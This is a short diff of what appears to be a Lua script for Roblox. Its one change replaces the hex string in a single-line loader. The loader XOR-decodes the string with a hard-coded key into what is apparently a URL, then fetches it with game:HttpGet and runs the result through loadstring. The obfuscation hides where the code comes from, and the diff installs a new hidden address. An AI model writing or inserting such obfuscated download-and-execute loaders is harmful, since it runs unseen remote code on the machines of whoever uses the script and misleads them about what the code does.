@@ -13,4 +13,4 @@
 
 ]]
 
-local a="5b414d46460f195b0f00001d5d0906000d1b01070a1506060b5d415c58411b551b0546070c17070001161e111d13151f11171c040d55025004460d58470a12085a42030a5b104945115752010c5b0e02035512471b121e5c0a5c44040d52434e4241535001540102060302400c08170d125f5d40535b504a4d4040015406000119665a43060b0c5d05060f"local b=tostring(3*2*83*7222).."thisisnotencrypted"local function c(d,b)local e=""for f=1,#d,2 do local g=tonumber(d:sub(f,f+1),16)local h=string.byte(b,(f-1)/2%#b+1)e=e..string.char(bit32.bxor(g,h))end;return e end;local i=c(a,b)loadstring(game:HttpGet(i))()
+local a="5b414d46460f195b0f00001d5d0906000d1b01070a1506060b5d415c58411b551b0546070c17070001161e111d13151f11171c030b57530401120c0d175b470f0a4d000c5b411c401056020704580453510e10471b121e5c5e5d4756585a11414712550602575b02060350125a08170f43595912540851454f4740520507540c19795a57100d1b5d05060f"local b=tostring(3*2*83*7222).."thisisnotencrypted"local function c(d,b)local e=""for f=1,#d,2 do local g=tonumber(d:sub(f,f+1),16)local h=string.byte(b,(f-1)/2%#b+1)e=e..string.char(bit32.bxor(g,h))end;return e end;local i=c(a,b)loadstring(game:HttpGet(i))()
